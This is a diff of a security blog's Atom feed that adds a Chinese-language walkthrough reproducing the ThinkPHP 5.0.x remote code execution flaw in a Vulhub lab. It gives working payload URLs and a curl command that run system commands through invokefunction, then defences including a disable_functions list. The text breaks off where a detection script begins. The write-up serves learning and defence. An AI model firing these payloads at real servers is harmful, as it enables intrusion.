@@ -3,31 +3,229 @@
     <id>https://bae-ace.github.io</id>
     <title>bae的博客 • Posts by &#34;web安全&#34; tag</title>
     <link href="https://bae-ace.github.io" />
-    <updated>2025-07-26T10:53:13.000Z</updated>
+    <updated>2025-07-27T09:25:25.000Z</updated>
+    <category term="Web安全" />
+    <category term="SQL注入" />
+    <category term="渗透测试" />
+    <category term="网络安全" />
+    <category term="Struts2" />
+    <category term="RCE" />
+    <category term="漏洞复现" />
+    <category term="OGNL注入" />
+    <category term="ThinkPHP" />
+    <category term="linux" />
+    <category term="命令" />
+    <category term="hexo" />
+    <category term="博客搭建" />
+    <category term="初始测试" />
     <category term="PWN" />
     <category term="ELF" />
     <category term="ROP" />
     <category term="CTF" />
     <category term="二进制安全" />
-    <category term="工具" />
-    <category term="sqlmap" />
-    <category term="渗透测试" />
-    <category term="Web安全" />
-    <category term="SQL注入" />
-    <category term="网络安全" />
-    <category term="hexo" />
-    <category term="博客搭建" />
-    <category term="初始测试" />
-    <category term="Struts2" />
-    <category term="RCE" />
-    <category term="漏洞复现" />
-    <category term="OGNL注入" />
-    <category term="linux" />
-    <category term="命令" />
-    <category term="信息收集" />
-    <category term="子域名" />
     <category term="命令执行" />
     <category term="漏洞利用" />
+    <category term="工具" />
+    <category term="sqlmap" />
+    <category term="信息收集" />
+    <category term="子域名" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/</id>
+        <title>ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/"/>
+        <content type="html">&lt;h1 id=&#34;深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）&#34;&gt;&lt;a href=&#34;#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）&#34; class=&#34;headerlink&#34; title=&#34;深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）&#34;&gt;&lt;/a&gt;深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）&lt;/h1&gt;&lt;h2 id=&#34;一、漏洞背景简介-🔍&#34;&gt;&lt;a href=&#34;#一、漏洞背景简介-🔍&#34; class=&#34;headerlink&#34; title=&#34;一、漏洞背景简介 🔍&#34;&gt;&lt;/a&gt;一、漏洞背景简介 🔍&lt;/h2&gt;&lt;p&gt;ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 &lt;code&gt;invokeFunction&lt;/code&gt;）的访问控制不严格，存在严重的 &lt;strong&gt;远程代码执行（RCE）漏洞&lt;/strong&gt;。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt; 或 &lt;code&gt;system&lt;/code&gt;），实现远程执行任意代码或系统命令，危害极大。&lt;/p&gt;
+&lt;p&gt;本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、漏洞环境搭建&#34;&gt;&lt;a href=&#34;#二、漏洞环境搭建&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞环境搭建&#34;&gt;&lt;/a&gt;二、漏洞环境搭建&lt;/h2&gt;&lt;p&gt;为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：&lt;/p&gt;
+&lt;h3 id=&#34;1-基础环境&#34;&gt;&lt;a href=&#34;#1-基础环境&#34; class=&#34;headerlink&#34; title=&#34;1. 基础环境&#34;&gt;&lt;/a&gt;1. 基础环境&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux（推荐使用虚拟机）  &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：已安装 Docker 和 Docker Compose  &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络模式&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;NAT（用于访问外部网络）&lt;/li&gt;
+&lt;li&gt;仅主机模式（Host-Only，Kali IP：&lt;code&gt;192.168.56.102&lt;/code&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;硬件要求&lt;/strong&gt;：建议 4GB 内存，2 核 CPU&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-获取-Vulhub-项目&#34;&gt;&lt;a href=&#34;#2-获取-Vulhub-项目&#34; class=&#34;headerlink&#34; title=&#34;2. 获取 Vulhub 项目&#34;&gt;&lt;/a&gt;2. 获取 Vulhub 项目&lt;/h3&gt;&lt;p&gt;Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 切换到工作目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; /root/vulhub/thinkphp/5-rce&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 如果未下载 Vulhub，克隆项目&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/thinkphp/5-rce&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;3-启动漏洞环境&#34;&gt;&lt;a href=&#34;#3-启动漏洞环境&#34; class=&#34;headerlink&#34; title=&#34;3. 启动漏洞环境&#34;&gt;&lt;/a&gt;3. 启动漏洞环境&lt;/h3&gt;&lt;p&gt;在 vulhub&amp;#x2F;thinkphp&amp;#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;启动后，访问以下地址：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 &lt;/p&gt;
+&lt;h3 id=&#34;4-容器管理操作&#34;&gt;&lt;a href=&#34;#4-容器管理操作&#34; class=&#34;headerlink&#34; title=&#34;4. 容器管理操作&#34;&gt;&lt;/a&gt;4. 容器管理操作&lt;/h3&gt;&lt;p&gt;查看运行中的容器：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker ps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;示例输出：&lt;/p&gt;
+&lt;figure class=&#34;highlight zsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs zsh&#34;&gt;CONTAINER ID   IMAGE                       PORTS                    NAMES&lt;br&gt;e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&amp;gt;80/tcp     thinkphp_5-rce_1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;停止指定容器：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker stop e5117e659934&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;一键停止并移除容器及网络：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose down&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;三、漏洞原理解析&#34;&gt;&lt;a href=&#34;#三、漏洞原理解析&#34; class=&#34;headerlink&#34; title=&#34;三、漏洞原理解析&#34;&gt;&lt;/a&gt;三、漏洞原理解析&lt;/h2&gt;&lt;h3 id=&#34;漏洞成因&#34;&gt;&lt;a href=&#34;#漏洞成因&#34; class=&#34;headerlink&#34; title=&#34;漏洞成因&#34;&gt;&lt;/a&gt;漏洞成因&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 &lt;code&gt;\think\app::invokeFunction&lt;/code&gt;）。在 5.0.23 及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;），并传递函数名和参数，从而触发远程代码执行。&lt;/p&gt;
+&lt;h3 id=&#34;核心问题&#34;&gt;&lt;a href=&#34;#核心问题&#34; class=&#34;headerlink&#34; title=&#34;核心问题&#34;&gt;&lt;/a&gt;核心问题&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;动态函数调用&lt;/strong&gt;：&lt;code&gt;call_user_func_array&lt;/code&gt; 允许动态调用任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt; 等）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数未过滤&lt;/strong&gt;：用户输入的 &lt;code&gt;vars[0]&lt;/code&gt;（函数名）和 &lt;code&gt;vars[1][]&lt;/code&gt;（函数参数）直接传递到函数执行器，未经严格验证。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;路由暴露&lt;/strong&gt;：通过 &lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;，攻击者可直接访问框架核心类。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞危害&#34;&gt;&lt;a href=&#34;#漏洞危害&#34; class=&#34;headerlink&#34; title=&#34;漏洞危害&#34;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;执行任意 PHP 代码&lt;/li&gt;
+&lt;li&gt;运行系统命令，获取权限&lt;/li&gt;
+&lt;li&gt;上传 WebShell，长期控制服务器&lt;/li&gt;
+&lt;li&gt;窃取配置文件、数据库信息&lt;/li&gt;
+&lt;li&gt;删除文件或修改系统配置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、漏洞利用演示&#34;&gt;&lt;a href=&#34;#四、漏洞利用演示&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞利用演示&#34;&gt;&lt;/a&gt;四、漏洞利用演示&lt;/h2&gt;&lt;p&gt;以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。&lt;/p&gt;
+&lt;h3 id=&#34;1-测试-PHP-函数调用&#34;&gt;&lt;a href=&#34;#1-测试-PHP-函数调用&#34; class=&#34;headerlink&#34; title=&#34;1. 测试 PHP 函数调用&#34;&gt;&lt;/a&gt;1. 测试 PHP 函数调用&lt;/h3&gt;&lt;p&gt;访问以下 Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;参数解析&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;：指定路由&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;function=call_user_func_array&lt;/code&gt;：调用函数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;vars[0]=phpinfo&lt;/code&gt;：目标函数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;vars[1][]=1&lt;/code&gt;：参数（执行 phpinfo(1)）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;页面显示 phpinfo 配置信息，说明漏洞存在 &lt;/p&gt;
+&lt;h3 id=&#34;2-执行系统命令&#34;&gt;&lt;a href=&#34;#2-执行系统命令&#34; class=&#34;headerlink&#34; title=&#34;2. 执行系统命令&#34;&gt;&lt;/a&gt;2. 执行系统命令&lt;/h3&gt;&lt;p&gt;执行 &lt;code&gt;whoami&lt;/code&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;结果示例&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;表示系统命令执行成功。&lt;/p&gt;
+&lt;h3 id=&#34;其他命令测试：&#34;&gt;&lt;a href=&#34;#其他命令测试：&#34; class=&#34;headerlink&#34; title=&#34;其他命令测试：&#34;&gt;&lt;/a&gt;其他命令测试：&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;查看用户 ID：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;列出目录：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ls%20/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;查看网络配置：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ifconfig&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-使用-Curl-测试&#34;&gt;&lt;a href=&#34;#3-使用-Curl-测试&#34; class=&#34;headerlink&#34; title=&#34;3. 使用 Curl 测试&#34;&gt;&lt;/a&gt;3. 使用 Curl 测试&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;注意：URL 中的 &lt;code&gt;\&lt;/code&gt; 要写成 &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;4-使用-Burp-Suite-测试&#34;&gt;&lt;a href=&#34;#4-使用-Burp-Suite-测试&#34; class=&#34;headerlink&#34; title=&#34;4. 使用 Burp Suite 测试&#34;&gt;&lt;/a&gt;4. 使用 Burp Suite 测试&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;在浏览器中访问目标页面，拦截请求&lt;/li&gt;
+&lt;li&gt;将 Payload 粘贴进 Repeater 中测试&lt;/li&gt;
+&lt;li&gt;修改 &lt;code&gt;vars[1][]&lt;/code&gt; 的值如 &lt;code&gt;id&lt;/code&gt;、&lt;code&gt;ls&lt;/code&gt; 等&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、Payload-结构总结&#34;&gt;&lt;a href=&#34;#五、Payload-结构总结&#34; class=&#34;headerlink&#34; title=&#34;五、Payload 结构总结&#34;&gt;&lt;/a&gt;五、Payload 结构总结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;参数键&lt;/th&gt;
+&lt;th&gt;功能说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;请求路由，指向 ThinkPHP 核心类&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;要调用的 PHP 函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;执行的函数名称（如 &lt;code&gt;phpinfo&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;函数的参数数组（如 &lt;code&gt;whoami&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、防御措施&#34;&gt;&lt;a href=&#34;#六、防御措施&#34; class=&#34;headerlink&#34; title=&#34;六、防御措施&#34;&gt;&lt;/a&gt;六、防御措施&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;升级 ThinkPHP 版本&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;升级至 ThinkPHP 5.0.24 或更高版本。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;输入验证与过滤&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;白名单验证 &lt;code&gt;s&lt;/code&gt; 参数&lt;/li&gt;
+&lt;li&gt;禁用危险函数如 &lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;严格过滤所有用户输入参数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用危险函数&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中：&lt;/p&gt;
+&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;disable_functions = &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;exec&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;system&lt;/span&gt;,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Web 服务运行用户不要使用 &lt;code&gt;root&lt;/code&gt;，限制文件访问权限。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;部署 WAF&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;拦截请求中包含敏感函数或路径的攻击尝试。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全审计与监控&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;定期扫描、日志审计，发现异常行为。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、笔记总结&#34;&gt;&lt;a href=&#34;#七、笔记总结&#34; class=&#34;headerlink&#34; title=&#34;七、笔记总结&#34;&gt;&lt;/a&gt;七、笔记总结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;内容项&lt;/th&gt;
+&lt;th&gt;信息&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;漏洞类型&lt;/td&gt;
+&lt;td&gt;RCE（远程代码执行）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;影响版本&lt;/td&gt;
+&lt;td&gt;ThinkPHP 5.0.x 至 5.0.23&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;漏洞原因&lt;/td&gt;
+&lt;td&gt;动态函数调用缺乏授权校验&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;复现方式&lt;/td&gt;
+&lt;td&gt;URL GET 请求构造 Payload&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;环境工具&lt;/td&gt;
+&lt;td&gt;Vulhub、Docker、Kali Linux&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;八、附加玩法&#34;&gt;&lt;a href=&#34;#八、附加玩法&#34; class=&#34;headerlink&#34; title=&#34;八、附加玩法&#34;&gt;&lt;/a&gt;八、附加玩法&lt;/h2&gt;&lt;h3 id=&#34;自动化检测脚本&#34;&gt;&lt;a href=&#34;#自动化检测脚本&#34; class=&#34;headerlink&#34; title=&#34;自动化检测脚本&#34;&gt;&lt;/a&gt;自动化检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span 